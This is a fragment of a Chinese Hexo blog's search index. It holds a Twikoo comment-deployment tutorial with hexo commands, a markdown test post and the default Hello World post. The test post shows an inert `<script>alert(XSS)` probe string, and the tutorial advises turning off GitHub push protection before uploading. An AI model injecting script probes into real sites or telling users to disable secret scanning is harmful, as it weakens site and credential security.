class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//作者: James He</span></span><br><span class="line"><span class="comment">//链接: https://james-blog.top/posts/21.html</span></span><br><span class="line"><span class="comment">//来源: James的成长之路</span></span><br><span class="line"><span class="comment">//著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span></span><br></pre></td></tr></table></figure><p>Twikoo评论系统部署(Vercel方式)</p><p>参考文字教程：</p><ul><li><p><a href="https://twikoo.js.org/quick-start.html#%E9%92%88%E5%AF%B9-vercel-%E9%83%A8%E7%BD%B2%E7%9A%84%E6%9B%B4%E6%96%B0%E6%96%B9%E5%BC%8F">官方：Twikoo文档-针对Vercel的部署</a></p></li><li><p><a href="https://tzy1997.com/articles/hexo1611/">TZY：基于 Hexo 键入评论功能</a></p></li><li><blockquote><p>在静态博客里添加Twikoo评论系统，并配置邮箱和TG通知<br><a href="https://thirdshire.com/twikoo-tutorial/">https://thirdshire.com/twikoo-tutorial/</a><br><a href="https://sheerkvc.top/2024/01/22/62.commentUpdate/">https://sheerkvc.top/2024/01/22/62.commentUpdate/</a><br>快速创建Google应用专用密码，登录第三方邮箱app<br><a href="https://www.milesytech.com/d/36">https://www.milesytech.com/d/36</a></p></blockquote></li></ul><p>视频教程：</p><ul><li><a href="https://www.bilibili.com/video/BV1Fh411e7ZH/">Twikoo Vercel 部署教程</a></li><li><a href="https://www.bilibili.com/video/BV1Re4y1H7g8/">安知鱼：23.butterfly配置twikoo评论系统</a></li></ul><h2 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#三合一：hexo cl; hexo g; hexo d</span></span><br><span class="line">hexo clean <span class="comment"># 清除已经生成的旧文件，删除public文件夹</span></span><br><span class="line">hexo generate <span class="comment"># 生成静态文件，把md文件转换为html，存储到public文件夹下</span></span><br><span class="line">hexo server <span class="comment"># 运行服务，本地预览，一般地址为 http://localhost:4000/</span></span><br><span class="line">hexo deploy <span class="comment"># 上传，每次上传会覆盖全部代码，可以把非md文件复制到sourec文件夹下，该处文件也会复制到public文件夹下</span></span><br><span class="line">hexo new hello <span class="comment"># 自动使用scaffolds目录下的模版 Created: *\source\_posts\hello.md</span></span><br></pre></td></tr></table></figure><blockquote><p>上传需要把<a href="https://github.com/settings/security_analysis">https://github.com/settings/security_analysis</a> Push protection for yourself 关闭，以后再打开。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试</title>
      <link href="/2024/10/16/%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/10/16/%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="标题一"><a href="#标题一" class="headerlink" title="标题一"></a>标题一</h1><p>欣赏这张图片</p><p><img src="https://img.shalom86012.eu.org/imgs/shouanren.webp" alt="img"></p><h2 id="标题二"><a href="#标题二" class="headerlink" title="标题二"></a>标题二</h2><blockquote><p>引用：</p><p>hello</p></blockquote><p>加粗：</p><p><strong>hello</strong></p><p>斜体：</p><p><em>hello</em></p><p>代码：</p><p><code>&lt;html&gt;</code></p><p><code>&lt;script&gt;alert(XSS)</code></p><p><code>&lt;/script&gt;</code></p><p><code>&lt;/html&gt;</code></p><p>有序列表：</p><ol><li>合理</li><li>微服务</li><li>是否</li></ol><p>无序列表：</p><ul><li>是否</li><li>收费</li><li>我国</li></ul><p>任务列表：</p><ul><li><input checked="" disabled="" type="checkbox"> 水电费</li><li><input disabled="" type="checkbox"> 违反</li><li><input checked="" disabled="" type="checkbox"> 微分</li></ul><hr><p>代码块：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;blog.shalom86012.eu.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结束了</p>]]></content>
      
      
      <categories>
          
          <category> 分类一 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 标签一 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/10/16/hello-world/"/>
      <url>/2024/10/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
